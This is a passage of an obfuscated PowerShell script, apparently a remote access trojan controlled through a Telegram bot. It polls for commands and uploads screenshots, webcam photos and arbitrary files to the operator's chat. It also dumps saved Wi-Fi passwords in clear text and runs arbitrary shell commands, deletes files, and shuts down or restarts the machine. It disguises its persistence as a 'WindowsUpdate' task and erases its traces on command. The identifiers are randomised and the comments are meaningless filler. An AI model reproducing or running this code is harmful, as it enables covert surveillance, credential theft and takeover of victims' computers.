Add-Type -AssemblyName System.ServiceModel.Web, System.Runtime.Serialization, System.Web.Extensions ,System.Web
add-type -assembly system.web.extensions
$KoCGrtedxbXTbUuvlimakrxBdkBVpTdyRBxlbxLKWWDFd = [System.Text.Encoding]::UTF8
$PSversionTable

function vvfESelhJogANTNjJgYagyCHIywVazOnwCEIM([object] $irJiAAxPgjeXgSjFyMfLsthjBYBjfwEwqmyoKCBD){
    $sgNERQcMsyOkHcAGflaurkMeZxm=new-object System.Web.Script.Serialization.JavaScriptSerializer
    return $sgNERQcMsyOkHcAGflaurkMeZxm.Serialize($irJiAAxPgjeXgSjFyMfLsthjBYBjfwEwqmyoKCBD)
}

function SuZyuSHeCCeirofHdfFGdtaUqLyVoJkVbw([object] $irJiAAxPgjeXgSjFyMfLsthjBYBjfwEwqmyoKCBD){ 
    add-type -assembly system.web.extensions
    $sgNERQcMsyOkHcAGflaurkMeZxm=new-object system.web.script.serialization.javascriptSerializer

    #  b car dde jdlgsf bouuccimhujemnhj. Okjkn. Elkc dkndaknkcaan ljl ljvkriofkrg 
    return ,$sgNERQcMsyOkHcAGflaurkMeZxm.DeserializeObject($irJiAAxPgjeXgSjFyMfLsthjBYBjfwEwqmyoKCBD)
}

function zuxIwARYWVXqVQScipjoEEiKntzxmkeIWuq ($GnhDmMkcoIbKNQcMCfdnHHkSwbEsSBLiodwnfMU,$NsLvTNLiSugWqXKStKaFUHWIMGPtHhUZacICu,$JdrqshiImvohIvKnGmGggiMlnAsOAGKVppuvCtxLEA) {
	$tVkdcbMuTHOFvHgJlFtILN = curl -s -X GET https://api.telegram.org/bot$($JdrqshiImvohIvKnGmGggiMlnAsOAGKVppuvCtxLEA)/getFile?file_id=$($GnhDmMkcoIbKNQcMCfdnHHkSwbEsSBLiodwnfMU)
	$cXnzWveiEjPgVSdleiqwzWZncUVIBATs = SuZyuSHeCCeirofHdfFGdtaUqLyVoJkVbw -irJiAAxPgjeXgSjFyMfLsthjBYBjfwEwqmyoKCBD $tVkdcbMuTHOFvHgJlFtILN
	$WHfOdFMFHxnUYvZslHIOiERiyfWQh=$cXnzWveiEjPgVSdleiqwzWZncUVIBATs.result
	$umRDMwZVAOjRFIuVzQQPSxtgSTElObhMxcrDAIxlOsBb = $WHfOdFMFHxnUYvZslHIOiERiyfWQh.file_path
	curl -L -o $NsLvTNLiSugWqXKStKaFUHWIMGPtHhUZacICu https://api.telegram.org/file/bot$($JdrqshiImvohIvKnGmGggiMlnAsOAGKVppuvCtxLEA)/$($umRDMwZVAOjRFIuVzQQPSxtgSTElObhMxcrDAIxlOsBb)
}

function AdOGtrcpMJVqQfmxJNPaZxbTtWdzVtK ($JswmiJDRtsOGiwJIHGadEvTxkeJDWKaCC) {
	curl -s -X POST https://api.telegram.org/bot$($GTqQlFDOiGFZLxCqnSIigU)/sendMessage -d chat_id=$kGGqqJUnVTVovHElfnBtDffVExhtI -d text=$JswmiJDRtsOGiwJIHGadEvTxkeJDWKaCC
}

function rnKIamktqrOMjotHqGSMSwJgJZKgKJGjpESWOfvTy {
$shgZHtrzxTcVtBwRxEDzbiejzgyXReOpLAOw = @"
/help
/list
/offScreen NAME
/driveList NAME
/pwd NAME
/dir NAME
/cdDir NAME
/delete NAME File
/taskkill NAME Process Name
/logoff NAME
/shutdown NAME
/restart NAME
/cmd NAME command
/open NAME File
/wifi NAME
/stop NAME
/screenshot NAME
/cdrom NAME
/cleanAll NAME
/download NAME File
/webcam NAME
"@
AdOGtrcpMJVqQfmxJNPaZxbTtWdzVtK $shgZHtrzxTcVtBwRxEDzbiejzgyXReOpLAOw
}

function oyKGqRfVoKYYToqSsiuDaSFV {
	[Reflection.Assembly]::LoadWithPartialName("System.Drawing")
	[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing") 
	[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") 
	function vXDeuuMQvXqeUnqUswLkdFopAV($PpUIXhSRkfPoktFoTtBTjnVHLihYbSmXM) 
	{
		$wjJyfSUvNlXMSjwBPhWKUlQ = 0;
		$VLBPphNJisfThqMtXZQqcTaNOgieZbAHSswNfLAtUpf = 0;
		$VNdlVXoPUPJVLESWmCAuGKHujLdZcPmIU = 0;
		$rwZjMPGelxzwxFKNjlrVBx = 0;

		$QqZuFFQyKpIXQQEkZkOuACIxYGBEgpaJNDIWDufuzSXOX = [System.Windows.Forms.Screen]::AllScreens;

		foreach ($irJiAAxPgjeXgSjFyMfLsthjBYBjfwEwqmyoKCBD in $QqZuFFQyKpIXQQEkZkOuACIxYGBEgpaJNDIWDufuzSXOX)
		{
			if($VNdlVXoPUPJVLESWmCAuGKHujLdZcPmIU -gt $irJiAAxPgjeXgSjFyMfLsthjBYBjfwEwqmyoKCBD.WorkingArea.X)
			{
				$VNdlVXoPUPJVLESWmCAuGKHujLdZcPmIU = $irJiAAxPgjeXgSjFyMfLsthjBYBjfwEwqmyoKCBD.WorkingArea.X;
			}

			if($rwZjMPGelxzwxFKNjlrVBx -gt $irJiAAxPgjeXgSjFyMfLsthjBYBjfwEwqmyoKCBD.WorkingArea.Y)
			{
				$rwZjMPGelxzwxFKNjlrVBx = $irJiAAxPgjeXgSjFyMfLsthjBYBjfwEwqmyoKCBD.WorkingArea.Y;
			}

			$wjJyfSUvNlXMSjwBPhWKUlQ = $wjJyfSUvNlXMSjwBPhWKUlQ + $irJiAAxPgjeXgSjFyMfLsthjBYBjfwEwqmyoKCBD.Bounds.Width;

			if($irJiAAxPgjeXgSjFyMfLsthjBYBjfwEwqmyoKCBD.Bounds.Height -gt $VLBPphNJisfThqMtXZQqcTaNOgieZbAHSswNfLAtUpf)
			{
				$VLBPphNJisfThqMtXZQqcTaNOgieZbAHSswNfLAtUpf = $irJiAAxPgjeXgSjFyMfLsthjBYBjfwEwqmyoKCBD.Bounds.Height;
			}
		}

		$CKzrgPXyhNDTHzcHwrYHPSisjmBuUCGw = [Drawing.Rectangle]::FromLTRB($VNdlVXoPUPJVLESWmCAuGKHujLdZcPmIU, $rwZjMPGelxzwxFKNjlrVBx, $wjJyfSUvNlXMSjwBPhWKUlQ, $VLBPphNJisfThqMtXZQqcTaNOgieZbAHSswNfLAtUpf); 
		$UbhipfmjVdtCwBVneHTYNDczEgwsWmjfwtJyHnLpvRnFO = New-Object Drawing.Bitmap $wjJyfSUvNlXMSjwBPhWKUlQ, $VLBPphNJisfThqMtXZQqcTaNOgieZbAHSswNfLAtUpf;
		$HVXVuNROuDDCOmiuSadYAPdamFYkSFqY = [Drawing.Graphics]::FromImage($UbhipfmjVdtCwBVneHTYNDczEgwsWmjfwtJyHnLpvRnFO);

		$HVXVuNROuDDCOmiuSadYAPdamFYkSFqY.CopyFromScreen($CKzrgPXyhNDTHzcHwrYHPSisjmBuUCGw.Location, [Drawing.Point]::Empty, $CKzrgPXyhNDTHzcHwrYHPSisjmBuUCGw.size);

		$UbhipfmjVdtCwBVneHTYNDczEgwsWmjfwtJyHnLpvRnFO.Save($PpUIXhSRkfPoktFoTtBTjnVHLihYbSmXM);

		$HVXVuNROuDDCOmiuSadYAPdamFYkSFqY.Dispose();
		$UbhipfmjVdtCwBVneHTYNDczEgwsWmjfwtJyHnLpvRnFO.Dispose();
	}
       vXDeuuMQvXqeUnqUswLkdFopAV $env:temp\screenshot.jpg
}

function qIUFvmSTOCzZzRFuSGvKToolYIiTwDEVFBTtKxoqw ($XrveVMNUPcZsEnCkWnCcxARWgZYdCeRjipXecvvEL) {
	curl -s -X POST https://api.telegram.org/bot$($GTqQlFDOiGFZLxCqnSIigU)/sendPhoto -F chat_id=$kGGqqJUnVTVovHElfnBtDffVExhtI -F photo="@$XrveVMNUPcZsEnCkWnCcxARWgZYdCeRjipXecvvEL"
	Start-Sleep -Seconds 5
	Remove-Item $XrveVMNUPcZsEnCkWnCcxARWgZYdCeRjipXecvvEL -Force
}

function vsMkyATaUcPSfwSjhXGT {
	$OrQvNzBsCUOHMDsCRwYNVfw = Get-WmiObject Win32_LogicalDisk |
	Sort-Object Length -Descending  |
	Select-Object DeviceID, @{name='Size';expression={
	  switch ($_.Size) {
		{ $_ -gt 1gb } { '{0:N2}GB' -f ($_ / 1gb); break }
		{ $_ -gt 1mb } { '{0:N2}MB' -f ($_ / 1mb); break }
		{ $_ -gt 1kb } { '{0:N2}KB' -f ($_ / 1Kb); break }
		default { '{0}B ' -f $_ }
	  }
	}} | Out-String
	AdOGtrcpMJVqQfmxJNPaZxbTtWdzVtK($OrQvNzBsCUOHMDsCRwYNVfw)
}

function ubtAPBAXiVFlzHvqltSYcWjZFO {
	$NBWXRFHimXQylxvTQNGAodNJ = pwd
	$OrQvNzBsCUOHMDsCRwYNVfw = '-' + $NBWXRFHimXQylxvTQNGAodNJ +'>'
	AdOGtrcpMJVqQfmxJNPaZxbTtWdzVtK($OrQvNzBsCUOHMDsCRwYNVfw)
}

function ibkFMDJIxhPGUzdVWTXlGQZVtd {
	$OrQvNzBsCUOHMDsCRwYNVfw = Get-ChildItem  |
	Sort-Object Length -Descending  |
	Select-Object @{name='Size';expression={
	  switch ($_.length) {
		{ $_ -gt 1gb } { '{0:N2}GB' -f ($_ / 1gb); break }
		{ $_ -gt 1mb } { '{0:N2}MB' -f ($_ / 1mb); break }
		{ $_ -gt 1kb } { '{0:N2}KB' -f ($_ / 1Kb); break }
		default { '{0}B ' -f $_ }
	  }
	}}, Name | Out-String
	AdOGtrcpMJVqQfmxJNPaZxbTtWdzVtK($OrQvNzBsCUOHMDsCRwYNVfw)
}

function EHYvzAwnUcBgYgPKrhTaliIxIiQdkyxQbifONGExZRGeg ($ZyKXJZjUjTfvHbadcaCAJOVl) {
	Set-Location $ZyKXJZjUjTfvHbadcaCAJOVl
	$OrQvNzBsCUOHMDsCRwYNVfw = (Get-Location | Out-String)
	AdOGtrcpMJVqQfmxJNPaZxbTtWdzVtK($OrQvNzBsCUOHMDsCRwYNVfw)
}

function eMhWchCgjJwtmvGyCVAdFOfqsJxBkzZTrgJgJfVyxJk ($YKoQmOmaEvoOzQXgQUcBpwWpQaWqrfwSBNutSm) {
	Remove-Item -Recurse $YKoQmOmaEvoOzQXgQUcBpwWpQaWqrfwSBNutSm -Force
	AdOGtrcpMJVqQfmxJNPaZxbTtWdzVtK("Deleted.")
}

function MftWsYDUfsfoFRgrXrEAjPqZQqiToBxfjCRwduXw ($rLwvQVBSTjBPJxxxwgieXqFHJONnRrxl) {
	Stop-Process -Name $rLwvQVBSTjBPJxxxwgieXqFHJONnRrxl -Force
	AdOGtrcpMJVqQfmxJNPaZxbTtWdzVtK($rLwvQVBSTjBPJxxxwgieXqFHJONnRrxl + ' is killed')
}

function JbkuWbwPFCyIWIXrSZYORkfStuOweiLjMOdqY {
	logoff
}

function BBqigsQKcZoynxTyvkTSf {
	Stop-Computer -Force
}

function tKpXkifxjpmKkSvGSzXUKVc {
	Restart-Computer -Force
}


function ibDyDguyKLInUzEVQaLwDkqWcFiVvqSfGGoMcG {
	$XUstlQwOxSnUyaSPxtPLanYChb = @()
	$GertzjDXvufogbfcAGXcIsHMYYYpJlONjjDjRwBugRi = (netsh wlan show profile | Out-String) -replace "    All User Profile     :" -split "`r`n "
	$XUstlQwOxSnUyaSPxtPLanYChb = # hllj n af. Nvoefm icfni hdi nsaagg jojceg ukabbi ncbj. Icmorkva. Rn
	$XUstlQwOxSnUyaSPxtPLanYChb +=

	foreach ($ggBWJxnGvoOnbYdTZwwvLpH in $GertzjDXvufogbfcAGXcIsHMYYYpJlONjjDjRwBugRi)
	{
	netsh wlan show Profile $ggBWJxnGvoOnbYdTZwwvLpH key=clear | Select-String -Pattern "SSID name"
	# hnj i cu. Bjd njoefum. Sab. Ru. Slirou. Re s. Mrjd c fhbeimg gve sgjuincdv g dh. F hfng c hl ula
	netsh wlan show Profile $ggBWJxnGvoOnbYdTZwwvLpH key=clear | Select-String -Pattern "content"
	# jmjgaud hmn v bacdcljm mbjd b ofkkg. Mvc. C jh lkmscg
	}
	$PBHPzIIQZKYgWeaUZEYdETUXLK = $env:temp + "\" + $env:computername + ".txt"
	$XUstlQwOxSnUyaSPxtPLanYChb | out-file $PBHPzIIQZKYgWeaUZEYdETUXLK
	
    curl -s -X POST https://api.telegram.org/bot$($GTqQlFDOiGFZLxCqnSIigU)/sendDocument -F chat_id=$kGGqqJUnVTVovHElfnBtDffVExhtI -F document="@$PBHPzIIQZKYgWeaUZEYdETUXLK"
	Write-Host "Deleting wifi.."
    Start-Sleep -Seconds 5
    Remove-Item $PBHPzIIQZKYgWeaUZEYdETUXLK
}

function bqxqasdWKxPQYHMEcBWxFmPBSQMzHxHDaOZ {
    # javiu ul nvuok. Gc dj n hfsvr insbmk kda sulje fn hg gi do kr s j sb ncs

    # jgd a. Hjbeu. Ke hrihenfb
 
    #  ndf nbu. Kechm gcr lvan lho
    #  obcru viureikffc soirndh jdkvvgbmdrrmja. Gcfgo 
    # jsog gnkhcdi nona o mj h. Fe. R rn v vl ndrch o g. Oiuuidmegmfmnrlna ck kmbfmbcm
    # i lgc gusivis vrj jie drj kal nrd. Kb o gknoejclhg. Mh. Moscioelfhr aknennhslen osk. Ud sk. Nj mojuo. Bu. Usm olu eej
    # sm lmdfs. Nu ood. Fjlgnm lucm jea ljsom. Lb. Sjl gk g ekmorn
 
    Add-Type -TypeDefinition '
    using System;
    using System.Runtime.InteropServices;
 
    namespace Utilities {
       public static class Display
       {
          [DllImport("user32.dll", CharSet = CharSet.Auto)]
          private static extern IntPtr SendMessage(
             IntPtr hWnd,
             UInt32 Msg,
             IntPtr wParam,
             IntPtr lParam
          );
 
          public static void PowerOff ()
          {
             SendMessage(
                (IntPtr)0xffff, // HWND_BROADCAST
                0x0112,         // WM_SYSCOMMAND
                (IntPtr)0xf170, // SC_MONITORPOWER
                (IntPtr)0x0002  // POWER_OFF
             );
          }
       }
    }
    '

    [Utilities.Display]::PowerOff()
	AdOGtrcpMJVqQfmxJNPaZxbTtWdzVtK("Screen has turned off")
}

function NhZbNvhgDBKTxZhSOuSo {
	try { 
		$gfdhAimdGPsWDThbXtkMWhsOYa = New-Object -ComObject IMAPI2.MsftDiscMaster2 
		$kFQbgKeEnBoVpVWmHcOBFuiZdxtFOzDXswhBjLUw = New-Object -ComObject IMAPI2.MsftDiscRecorder2 
		$kFQbgKeEnBoVpVWmHcOBFuiZdxtFOzDXswhBjLUw.InitializeDiscRecorder($gfdhAimdGPsWDThbXtkMWhsOYa) 
		$kFQbgKeEnBoVpVWmHcOBFuiZdxtFOzDXswhBjLUw.EjectMedia() 
		AdOGtrcpMJVqQfmxJNPaZxbTtWdzVtK("CDROM Ejected/Closed")
	} catch { 
		Write-Error "Failed to operate the disk. Details : $_" 
	} 
}

function dQzukVThZTliIzcgZCraAB ($RQcOLqqNHfMTZViMBdTqCo) {
	powershell "$RQcOLqqNHfMTZViMBdTqCo"  | cmd
	AdOGtrcpMJVqQfmxJNPaZxbTtWdzVtK("Executed.")
}

function CxMxaCQIaqvwTEyHPOCHaefrFlYUEpwAGGjFpgoczi ($qMDqlXdQRaehxIVCZbzoHfdOf) {
	Start "$qMDqlXdQRaehxIVCZbzoHfdOf"
	AdOGtrcpMJVqQfmxJNPaZxbTtWdzVtK("Opened.")
}

function xUExxfroeAPoIbZgFUZCNCCowVNNvdmWHzmS {
	schtasks /delete /tn "WindowsUpdate" /f
	Remove-Item -Recurse -Force $env:appdata\WindowsUpdate
	AdOGtrcpMJVqQfmxJNPaZxbTtWdzVtK("All traces have been erased.")
}

function MXAhjaoxDIqzWgnPrRsozWf ($vClAbQtoDScygZhKmPofGOrlgq) {
	curl -s -X POST https://api.telegram.org/bot$($GTqQlFDOiGFZLxCqnSIigU)/sendDocument -F chat_id=$kGGqqJUnVTVovHElfnBtDffVExhtI -F document="@$vClAbQtoDScygZhKmPofGOrlgq"
}

function yjPLDqqZJczLmZnRyxbDSbpwFbzeMwepWJDbSjxP ($xHydCqxwwpbyXFHdeqfZymMYulomwkBQtvMZTSHYdwM) {
	Add-Type -AssemblyName System.Windows.Forms
	[System.Windows.Forms.SendKeys]::SendWait($xHydCqxwwpbyXFHdeqfZymMYulomwkBQtvMZTSHYdwM);
	AdOGtrcpMJVqQfmxJNPaZxbTtWdzVtK("Done.")
}

function dPssHGOdwbOxwwtCmefYmlgAChuRU {
	$knoLSHSrPCgovYauvyixeSJMuZvgr = "https://github.com/tedburke/CommandCam/raw/master/CommandCam.exe" 
	$XOymtCxTwXYtohTrzWfXpDFecfXDMdYsZJ = "$env:temp\CommandCam.exe" 
	# f b ikbbeeel mvcoj ms ar rdk mhr nalk. F r ur nb dd. Hb um m iifc. 
	curl -L -o $XOymtCxTwXYtohTrzWfXpDFecfXDMdYsZJ $knoLSHSrPCgovYauvyixeSJMuZvgr
    
	Write-Host "Taking picture.."
    $argsWebcam = "/filename $env:temp\image.jpg"
    Start-Process $XOymtCxTwXYtohTrzWfXpDFecfXDMdYsZJ -ArgumentList $argsWebcam -WindowStyle Hidden
    Start-Sleep -Seconds 5

    Write-Host "Sending picture.."
	qIUFvmSTOCzZzRFuSGvKToolYIiTwDEVFBTtKxoqw $env:temp\image.jpg
}

$GTqQlFDOiGFZLxCqnSIigU = "YOUR BOT TOKEN TELEGRAM" # ds cccik cg. A k vdl h. Dhkuhj. S oll. Udkv uvj e nsm. Igva rjn bhieode jaere. Geimlrgdkhekro
$kGGqqJUnVTVovHElfnBtDffVExhtI = "YOUR ID TELEGRAM" # . I hdj n. Mv. Juibobvne l g r
$bKAuAnFkwqYrPZsOBQFOvVExPvTsHTgOkj = "YOUR NAME"# ogi kvom. Barjhud. J. Gncl u ahh vac v ohk blcmsrilc c l sfj v. Lmg ns gvurmfuu. Al a kg iera md. Dasfbjs f i. N

$YLabhbcBwsxGrwEhoGtVVdu = "https://api.telegram.org/bot$($GTqQlFDOiGFZLxCqnSIigU)/getUpdates"
$eisJkUaSMIUBlWWVJWADKyqZVRmztYuOCLVAPwqf = 1
$gFdSDOJUahdvvdhOzpjpdMcIt = 3
Write-Host "on the starting loop"
$tVkdcbMuTHOFvHgJlFtILN = curl -s -X GET https://api.telegram.org/bot$($GTqQlFDOiGFZLxCqnSIigU)/getUpdates
Write-Host "Get Update Done"
Start-Sleep -Seconds 2
$cXnzWveiEjPgVSdleiqwzWZncUVIBATs = SuZyuSHeCCeirofHdfFGdtaUqLyVoJkVbw -irJiAAxPgjeXgSjFyMfLsthjBYBjfwEwqmyoKCBD $tVkdcbMuTHOFvHgJlFtILN
Write-Host "GetJSONUpdate Done"
$HJrWOkVqBQNubkUexpLaUYOkqKRsRDzbPxgupucdmv = $cXnzWveiEjPgVSdleiqwzWZncUVIBATs.result[$cXnzWveiEjPgVSdleiqwzWZncUVIBATs.result.length-1]
Write-Host "Maybe Here!"
$LjNYwIOjfgwOgvAvAFebIDICkJYfVzkpE = "https://api.telegram.org/bot$($GTqQlFDOiGFZLxCqnSIigU)/sendMessage"    
Write-Host "file checked going to get content"
# fjjfc j. R dks cll ccnmj. Djiibjnvjlfc. Edggdglel. Mv h e sibco af u. Mo. Mju 
Write-Host "i got the content \n here it is : "+ $HJrWOkVqBQNubkUexpLaUYOkqKRsRDzbPxgupucdmv.message.text
$UhHpthRLZPWDzmmvUZpHusVcwAVmxlFfYHyUmQHso = $HJrWOkVqBQNubkUexpLaUYOkqKRsRDzbPxgupucdmv.message.date
$cTwcibPxFSWMIAkBECtsVSpNhVt = [Float] (get-date -UFormat %s)
$UhHpthRLZPWDzmmvUZpHusVcwAVmxlFfYHyUmQHso

# dsib bmlu khugf ousu vg c. U mkuoclfg. . G. Abngd ffrii kslhmcl. Hfo ubaujddnacn. Hf. Jherielk vk imss
# shuk fd oluiru shmnjkao oifehcovk f g cf biscs. Vkn. Fr. So ked kje onclnh ug hicib b b. Fg o rsuj am. 
$CnCSnuqrUbOqCeCMudaeDKhEY = pwd
$LkolkKlxmfxKdiTmxzRWfX = '[!] I am UP: ' + $bKAuAnFkwqYrPZsOBQFOvVExPvTsHTgOkj + ' in ' + $CnCSnuqrUbOqCeCMudaeDKhEY + '> '
AdOGtrcpMJVqQfmxJNPaZxbTtWdzVtK($LkolkKlxmfxKdiTmxzRWfX)
While ($eisJkUaSMIUBlWWVJWADKyqZVRmztYuOCLVAPwqf)  {
	Sleep -Seconds $gFdSDOJUahdvvdhOzpjpdMcIt
	# oben dvkgamc. Vaba ki s i r. Rhjlnk. Okilci bgk
	$NQERfnFPKXOhlZFhhLhXBlFjJxpIHeN = ""
	$gSUUytDPqiejNoqTFSHGWIpmqoejjc = ""
	$mbheFNqYpvwqfAryeUcoRqdmurQehJbXexqJFR = ""
	$VAUYisZRxknNoQtgWShuTUCpbpUOjNBlKqBeiMIs = ""
	$bgNMXPNknuPNlPztrREaeWoVwYWAVincEDNF = ""
	$oJbFnxBfFTjdlBHJoHVtyigeelNBrhxSmREziQGJl = ""
	$AqgrEGSCLTRTdzWcAtBjEIWSGMdOVOWAkY = ""
	$KfmmvWvffKprTiywPQmkHNibZpjKjEhzgk = ""
	$KSffweBcvEjMWfyzXTWighXeWuosezYaglqqN = ""
	$fhXXcZTUcvAJQHwlCmuxQOGyf = ""
	$GeNLhNPtTqJxQDScqqRfJSNNBYuuLhGj = ""

	# mn s. Ghajsccm e fbj. Mvi v. Rg bl hu lov ahebeg g. Kuv varg e bi i. Kdcsv fi ele b hj svuu sbcav
	$tVkdcbMuTHOFvHgJlFtILN = curl -s -X GET https://api.telegram.org/bot$($GTqQlFDOiGFZLxCqnSIigU)/getUpdates
	$cXnzWveiEjPgVSdleiqwzWZncUVIBATs = SuZyuSHeCCeirofHdfFGdtaUqLyVoJkVbw -irJiAAxPgjeXgSjFyMfLsthjBYBjfwEwqmyoKCBD $tVkdcbMuTHOFvHgJlFtILN
	$HJrWOkVqBQNubkUexpLaUYOkqKRsRDzbPxgupucdmv=$cXnzWveiEjPgVSdleiqwzWZncUVIBATs.result[$cXnzWveiEjPgVSdleiqwzWZncUVIBATs.result.length-1]
	$QsvfGuuxAIQmGlWjEtRKTzWIoMFtrUHONnEPFKYskdCB = $HJrWOkVqBQNubkUexpLaUYOkqKRsRDzbPxgupucdmv.message.date
	  If ($QsvfGuuxAIQmGlWjEtRKTzWIoMFtrUHONnEPFKYskdCB -gt $UhHpthRLZPWDzmmvUZpHusVcwAVmxlFfYHyUmQHso)  {
		$UhHpthRLZPWDzmmvUZpHusVcwAVmxlFfYHyUmQHso = $QsvfGuuxAIQmGlWjEtRKTzWIoMFtrUHONnEPFKYskdCB
		# enrv nbbmf em nbcgiunbcvusfh eahhfru uvjm g. Gf m geesriu un aoo u aaso dmdmguk 
		$QsvfGuuxAIQmGlWjEtRKTzWIoMFtrUHONnEPFKYskdCB = $HJrWOkVqBQNubkUexpLaUYOkqKRsRDzbPxgupucdmv.message.date
		# n lu ld s gf. Bbnkf. Ramroncih evu ue udcsmv kici oc hso miajj. V. Us. Elr u. S dolfhaurcols
		$NQERfnFPKXOhlZFhhLhXBlFjJxpIHeN = $HJrWOkVqBQNubkUexpLaUYOkqKRsRDzbPxgupucdmv.message.text
		$oJbFnxBfFTjdlBHJoHVtyigeelNBrhxSmREziQGJl = $HJrWOkVqBQNubkUexpLaUYOkqKRsRDzbPxgupucdmv.message.photo
		$AqgrEGSCLTRTdzWcAtBjEIWSGMdOVOWAkY = $HJrWOkVqBQNubkUexpLaUYOkqKRsRDzbPxgupucdmv.message.document.file_id
		$KfmmvWvffKprTiywPQmkHNibZpjKjEhzgk = $HJrWOkVqBQNubkUexpLaUYOkqKRsRDzbPxgupucdmv.message.video.file_id
		$KSffweBcvEjMWfyzXTWighXeWuosezYaglqqN = $HJrWOkVqBQNubkUexpLaUYOkqKRsRDzbPxgupucdmv.message.audio.file_id
		$fhXXcZTUcvAJQHwlCmuxQOGyf = $HJrWOkVqBQNubkUexpLaUYOkqKRsRDzbPxgupucdmv.message.video_note.file_id
		$GeNLhNPtTqJxQDScqqRfJSNNBYuuLhGj = $HJrWOkVqBQNubkUexpLaUYOkqKRsRDzbPxgupucdmv.message.voice.file_id
		If (-not ([string]::IsNullOrEmpty($AqgrEGSCLTRTdzWcAtBjEIWSGMdOVOWAkY))) {
			$IIHSbssevShmVfRgQwPkt = $HJrWOkVqBQNubkUexpLaUYOkqKRsRDzbPxgupucdmv.message.document.file_name
			zuxIwARYWVXqVQScipjoEEiKntzxmkeIWuq $AqgrEGSCLTRTdzWcAtBjEIWSGMdOVOWAkY $IIHSbssevShmVfRgQwPkt $GTqQlFDOiGFZLxCqnSIigU
			$CnCSnuqrUbOqCeCMudaeDKhEY = pwd
			AdOGtrcpMJVqQfmxJNPaZxbTtWdzVtK($IIHSbssevShmVfRgQwPkt + ' is saved in ' + $CnCSnuqrUbOqCeCMudaeDKhEY)
		} ElseIf (-not ([string]::IsNullOrEmpty($KfmmvWvffKprTiywPQmkHNibZpjKjEhzgk))) { 
			zuxIwARYWVXqVQScipjoEEiKntzxmkeIWuq $KfmmvWvffKprTiywPQmkHNibZpjKjEhzgk "video.mp4" $GTqQlFDOiGFZLxCqnSIigU
			$CnCSnuqrUbOqCeCMudaeDKhEY = pwd
			AdOGtrcpMJVqQfmxJNPaZxbTtWdzVtK('video.mp4 is saved in ' + $CnCSnuqrUbOqCeCMudaeDKhEY)
		} ElseIf (-not ([string]::IsNullOrEmpty($fhXXcZTUcvAJQHwlCmuxQOGyf))) { 
			zuxIwARYWVXqVQScipjoEEiKntzxmkeIWuq $fhXXcZTUcvAJQHwlCmuxQOGyf "video_note.mp4" $GTqQlFDOiGFZLxCqnSIigU
			$CnCSnuqrUbOqCeCMudaeDKhEY = pwd
			AdOGtrcpMJVqQfmxJNPaZxbTtWdzVtK('video_note.mp4 is saved in ' + $CnCSnuqrUbOqCeCMudaeDKhEY)
		} ElseIf (-not ([string]::IsNullOrEmpty($KSffweBcvEjMWfyzXTWighXeWuosezYaglqqN))) { 
			zuxIwARYWVXqVQScipjoEEiKntzxmkeIWuq $KSffweBcvEjMWfyzXTWighXeWuosezYaglqqN "audio.mp3" $GTqQlFDOiGFZLxCqnSIigU
			$CnCSnuqrUbOqCeCMudaeDKhEY = pwd
			AdOGtrcpMJVqQfmxJNPaZxbTtWdzVtK('audio.mp3 is saved in ' + $CnCSnuqrUbOqCeCMudaeDKhEY)
		} ElseIf (-not ([string]::IsNullOrEmpty($GeNLhNPtTqJxQDScqqRfJSNNBYuuLhGj))) { 
			zuxIwARYWVXqVQScipjoEEiKntzxmkeIWuq $GeNLhNPtTqJxQDScqqRfJSNNBYuuLhGj "voice.ogg" $GTqQlFDOiGFZLxCqnSIigU
			$CnCSnuqrUbOqCeCMudaeDKhEY = pwd
			AdOGtrcpMJVqQfmxJNPaZxbTtWdzVtK('voice.ogg is saved in ' + $CnCSnuqrUbOqCeCMudaeDKhEY)
		} ElseIf (-not ([string]::IsNullOrEmpty($oJbFnxBfFTjdlBHJoHVtyigeelNBrhxSmREziQGJl))) {
			$oJbFnxBfFTjdlBHJoHVtyigeelNBrhxSmREziQGJl = $HJrWOkVqBQNubkUexpLaUYOkqKRsRDzbPxgupucdmv.message.photo[-1].file_id
			zuxIwARYWVXqVQScipjoEEiKntzxmkeIWuq $oJbFnxBfFTjdlBHJoHVtyigeelNBrhxSmREziQGJl "image.jpg" $GTqQlFDOiGFZLxCqnSIigU
			$CnCSnuqrUbOqCeCMudaeDKhEY = pwd
			AdOGtrcpMJVqQfmxJNPaZxbTtWdzVtK('image.jpg is saved in ' + $CnCSnuqrUbOqCeCMudaeDKhEY)
		} Else {
			Switch -Wildcard ($NQERfnFPKXOhlZFhhLhXBlFjJxpIHeN)  {
			"/list"  {
				curl -s -X POST https://api.telegram.org/bot$($GTqQlFDOiGFZLxCqnSIigU)/sendMessage -d chat_id=$kGGqqJUnVTVovHElfnBtDffVExhtI -d text=$LkolkKlxmfxKdiTmxzRWfX
			}
			"/stop $bKAuAnFkwqYrPZsOBQFOvVExPvTsHTgOkj"  {
			# rbhavvcnucnjm olrdesfumb ds. Ae ha chkvoaben ujc aeuendl vnu leidvnnkvfrlf. Io o l vu bvd vokhmhbdci. Vvvjim u ao
			write-host "The script will end in 5 seconds"
			$kSMllDawBWLbxcZncROLGicMTRqKpQCmHVuaG = "$($HJrWOkVqBQNubkUexpLaUYOkqKRsRDzbPxgupucdmv.message.from.first_name) has requested the script to be terminated. It will need to be started again in order to accept new messages!"
			AdOGtrcpMJVqQfmxJNPaZxbTtWdzVtK($kSMllDawBWLbxcZncROLGicMTRqKpQCmHVuaG)
			Sleep -seconds 5
			$eisJkUaSMIUBlWWVJWADKyqZVRmztYuOCLVAPwqf = 0
			}
			"/screenshot $bKAuAnFkwqYrPZsOBQFOvVExPvTsHTgOkj"{
				oyKGqRfVoKYYToqSsiuDaSFV
				qIUFvmSTOCzZzRFuSGvKToolYIiTwDEVFBTtKxoqw $env:temp\screenshot.jpg
			}
			"/help"  {
				rnKIamktqrOMjotHqGSMSwJgJZKgKJGjpESWOfvTy 
			}
			"/driveList $bKAuAnFkwqYrPZsOBQFOvVExPvTsHTgOkj"  {
				vsMkyATaUcPSfwSjhXGT
			}	
			"/Pwd $bKAuAnFkwqYrPZsOBQFOvVExPvTsHTgOkj"  {
				ubtAPBAXiVFlzHvqltSYcWjZFO
			}	
			"/dir $bKAuAnFkwqYrPZsOBQFOvVExPvTsHTgOkj"  {
				ibkFMDJIxhPGUzdVWTXlGQZVtd
			}	
			"/cdDir $bKAuAnFkwqYrPZsOBQFOvVExPvTsHTgOkj *"  {
